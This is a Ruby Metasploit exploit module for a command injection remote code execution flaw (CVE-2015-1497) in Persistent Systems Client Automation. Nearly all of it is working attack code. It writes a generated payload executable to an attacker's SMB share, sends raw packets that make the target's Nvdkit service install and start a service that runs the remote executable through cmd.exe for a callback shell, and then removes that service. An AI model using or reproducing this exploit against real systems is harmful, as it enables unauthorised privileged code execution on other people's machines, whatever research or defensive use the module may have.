# Exploit Title: Persistent Systems Client Automation (PSCA, formerly HPCA or Radia) Command Injection Remote Code Execution Vulnerability
# Date: 2014-10-01
# Exploit Author: Ben Turner
# Vendor Homepage: Previosuly HP, now http://www.persistentsys.com/
# Version: 7.9, 8.1, 9.0, 9.1
# Tested on: Windows XP, Windows 7, Server 2003 and Server 2008
# CVE-2015-1497
# CVSS: 10

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::EXE	
	include Msf::Auxiliary::Report

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::Client
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants


	def initialize
		super(
			'Name'        => 'Persistent Systems Client Automation (PSCA, formerly HPCA or Radia) Command Injection Remote Code Execution Vulnerability',
			'Description' => %Q{
				This module exploits PS Client Automation, by sending a remote service install and creating a callback payload. 
			},
			'Author'         => [ 'Ben Turner' ],
			'License'        => BSD_LICENSE,
			'References'  =>
				[
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'WfsDelay'     => 10,
					'EXITFUNC' => 'process'
				},
			'Payload'     => { 'BadChars' => '', 'DisableNops' => true },
			'Platform'    => ['win'],
			'Targets'         =>
				[
					[ 'PS Client Automation on Windows XP, 7, Server 2003 & 2008', {}]
				],
			'DefaultTarget'   => 0,
			'DisclosureDate' => 'January 10 2014'
		)

		register_options([
			OptString.new('SMBServer', [true, 'The IP address of the SMB server', '192.168.1.1']),
			OptString.new('SMBShare', [true, 'The root directory that is shared', 'share']),
			Opt::RPORT(3465),
		], self.class)

	end

	def exploit

		createservice = "\x00\x24\x4D\x41\x43\x48\x49\x4E\x45\x00\x20\x20\x20\x20\x20\x20\x20\x20\x00"
		createservice << "Nvdkit.exe service install test -path \"c:\\windows\\system32\\cmd.exe /c \\\\#{datastore['SMBServer']}\\#{datastore['SMBShare']}\\installservice.exe\""
		createservice << "\x22\x00\x00\x00"

                startservice = "\x00\x24\x4D\x41\x43\x48\x49\x4E\x45\x00\x20\x20\x20\x20\x20\x20\x20\x20\x00"
                startservice << "Nvdkit service start test"
                startservice << "\x22\x00\x00\x00"

		removeservice = "\x00\x24\x4D\x41\x43\x48\x49\x4E\x45\x00\x20\x20\x20\x20\x20\x20\x20\x20\x00"
		removeservice << "Nvdkit service remove test"
		removeservice << "\x22\x00\x00\x00"

		def filedrop()
			begin
				origrport = self.datastore['RPORT']
				self.datastore['RPORT'] = 445
				origrhost = self.datastore['RHOST']
				self.datastore['RHOST'] = self.datastore['SMBServer']
				connect()
				smb_login()
				print_status("Generating payload, dropping here: \\\\#{datastore['SMBServer']}\\#{datastore['SMBShare']}\\installservice.exe'...")
				self.simple.connect("\\\\#{datastore['SMBServer']}\\#{datastore['SMBShare']}")
				exe = generate_payload_exe
				fd = smb_open("\\installservice.exe", 'rwct')
				fd << exe
				fd.close

				self.datastore['RPORT'] = origrport
				self.datastore['RHOST'] = origrhost
			
			rescue Rex::Proto::SMB::Exceptions::Error => e
				print_error("File did not exist, or could not connect to the SMB share: #{e}\n\n")	
				abort()
			end
		end

		def filetest()
			begin
				origrport = self.datastore['RPORT']
				self.datastore['RPORT'] = 445
				origrhost = self.datastore['RHOST']
				self.datastore['RHOST'] = self.datastore['SMBServer']
				connect()
				smb_login()
				print_status("Checking the remote share: \\\\#{datastore['SMBServer']}\\#{datastore['SMBShare']}")
				self.simple.connect("\\\\#{datastore['SMBServer']}\\#{datastore['SMBShare']}")
				file = "\\installservice.exe"
				filetest = smb_file_exist?(file)
				if filetest
					print_good("Found, upload was succesful! \\\\#{datastore['SMBServer']}\\#{datastore['SMBShare']}\\#{file}\n")
				else
					print_error("\\\\#{datastore['SMBServer']}\\#{file} - The file does not exist, try again!")
						
				end

				self.datastore['RPORT'] = origrport
				self.datastore['RHOST'] = origrhost
			
			rescue Rex::Proto::SMB::Exceptions::Error => e
				print_error("File did not exist, or could not connect to the SMB share: #{e}\n\n")	
				abort()
			end
		end

		begin
			filedrop()
			filetest()
			connect()
			sock.put(createservice)
			print_status("Creating the callback payload and installing the remote service")
			disconnect
			sleep(5)
			connect()
			sock.put(startservice)
                        print_good("Exploit sent, awaiting response from service. Waiting 15 seconds before removing the service")
			disconnect
			sleep(30)
			connect
			sock.put(removeservice)
			disconnect

		rescue ::Exception => e
			print_error("Could not connect to #{datastore['RHOST']}:#{datastore['RPORT']}\n\n")	
			abort()
		
		end
	end
end

